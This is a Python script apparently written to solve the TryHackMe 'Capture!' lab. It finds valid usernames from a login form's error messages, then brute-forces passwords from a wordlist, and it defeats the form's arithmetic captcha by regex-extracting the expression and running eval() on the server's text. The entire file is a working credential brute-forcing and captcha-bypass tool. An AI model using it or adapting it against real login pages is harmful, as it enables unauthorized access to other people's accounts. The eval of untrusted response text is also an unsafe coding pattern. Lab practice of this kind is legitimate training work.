#!/usr/share/python
###################
# SCRIPT MAKED BY #
#    @devop_oo    #
###################
import requests
from colorama import Fore
import argparse
import re


# Argparse
def formatter(prog): return argparse.HelpFormatter(prog, max_help_position=60)

parser = argparse.ArgumentParser(
    formatter_class=formatter, description='Script for brute forcing TryHackMe \'Capture!\' room')
parser.add_argument('-u', '--url', dest='host',
                    help='Victim Server Adress', required=True)
parser.add_argument('-p', '--passwords', dest='password',
                    help='Passwords Wordlist', required=True)
parser.add_argument('-l', '--usernames', dest='user',
                    help='Usernames Wordlist', required=True)
args = parser.parse_args()

# Verables
pattern = r'\d{1,4}\s(-|\+|\*|\/)\s\d{1,4}'
pattern_inv_user = r'does not exist'
pattern_inv_pass = r'Invalid password'

# Function
def captach_detour(text, re_pattern):
    text = str(text)
    return re.search(re_pattern, text).group(0)


def user_enum():
    try:
        with open(args.user, 'r+') as file:
            print(f'{Fore.LIGHTGREEN_EX}[ + ] Starting User Enumiration !')
            usernames = file.readlines()
            r = requests.post(args.host, {
                "username": 'test',
                "password": 'test',
                'captcha': 990
            })

            for user in usernames:
                captcha = eval(captach_detour(r.text, pattern))
                r = requests.post(args.host, {
                    "username": user.split()[0],
                    "password": 'test',
                    'captcha': captcha
                })
                user_re = re.search(pattern_inv_user, r.text)

                if user_re == None:
                    return (user.split()[0], captcha)

            print(f'{Fore.LIGHTRED_EX}[ - ] Username Not Found !')

    except KeyboardInterrupt:
        print('Exinting')
        exit()


def pass_enum(username, captcha):
    try:
        with open(args.password, 'r+') as passfile:
            print(f'{Fore.LIGHTGREEN_EX}[ + ] Starting Brute-Forcing !')
            passwords = passfile.readlines()

            r = requests.post(args.host, {
                "username": 'test',
                "password": 'test',
                'captcha': 990
            })

            for pass_s in passwords:
                captcha = eval(captach_detour(r.text, pattern))
                r = requests.post(args.host, {
                    "username": username,
                    "password": pass_s.split()[0],
                    'captcha': captcha
                })
                pass_re = re.search(pattern_inv_pass, r.text)

                if pass_re == None:
                    return pass_s.split()[0]
                
    except KeyboardInterrupt:
        exit()



def main():
    user = user_enum()
    print(f'{Fore.LIGHTGREEN_EX}[ + ] Username Found: {user[0]} \n')

    password = pass_enum(user[0], user[1])
    print(f'{Fore.LIGHTGREEN_EX}[ + ] Password Found: {password}', Fore.WHITE)


# Final
if __name__ == "__main__":
    main()
